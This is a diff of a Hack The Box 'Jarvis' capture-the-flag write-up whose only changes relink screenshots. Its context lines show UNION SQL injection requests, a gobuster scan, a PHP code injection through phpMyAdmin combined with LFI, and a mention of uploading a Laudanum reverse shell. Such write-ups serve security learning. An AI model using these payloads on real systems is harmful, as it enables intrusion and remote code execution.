@@ -102,14 +102,14 @@ When trying an invalid room number, the response changes:
 GET /room.php?cod=123 union select 1,2,3,4,5,6,7
 ```
 
-![UNION SQL Injection](https://kyuu-ji.github.io/htb-write-up/jarvis/jarvis_web-1.png)
+![UNION SQL Injection](jarvis_web-1.png)
 
 This means that the third statement is the cost and can be changed to whatever we want:
 ```markdown
 GET /room.php?cod=123 union select 1,2,"TEST",4,5,6,7
 ```
 
-![UNION SQL Injection](https://kyuu-ji.github.io/htb-write-up/jarvis/jarvis_web-2.png)
+![UNION SQL Injection](jarvis_web-2.png)
 
 It can also be changed to a SQL query:
 ```markdown
@@ -177,7 +177,7 @@ gobuster -u http://10.10.10.143/ dir -w /usr/share/wordlists/dirbuster/directory
 
 It found the directory _/phpmyadmin_ that forwards to a **phpMyAdmin** login prompt where the gained credentials work:
 
-![phpMyAdmin login page](https://kyuu-ji.github.io/htb-write-up/jarvis/jarvis_web-3.png)
+![phpMyAdmin login page](jarvis_web-3.png)
 
 ### Exploiting phpMyAdmin
 
@@ -189,11 +189,11 @@ Running a SQL statement:
 select '<?php phpinfo();exit;?>'
 ```
 
-![phpMyAdmin SQL query](https://kyuu-ji.github.io/htb-write-up/jarvis/jarvis_web-4.png)
+![phpMyAdmin SQL query](jarvis_web-4.png)
 
 Getting the session Cookie of phpMyAdmin:
 
-![phpMyAdmin session Cookie](https://kyuu-ji.github.io/htb-write-up/jarvis/jarvis_web-5.png)
+![phpMyAdmin session Cookie](jarvis_web-5.png)
 
 Exploiting the LFI and executing the PHP code:
 ```markdown
@@ -202,7 +202,7 @@ Exploiting the LFI and executing the PHP code:
 
 Now it shows _phpinfo_ and proofs code execution:
 
-![phpMyAdmin Code Execution](https://kyuu-ji.github.io/htb-write-up/jarvis/jarvis_web-6.png)
+![phpMyAdmin Code Execution](jarvis_web-6.png)
 
 A PHP reverse shell from the **Laudanum scripts** can be uploaded with the following statement on the phpMyAdmin interface:
 ```markdown
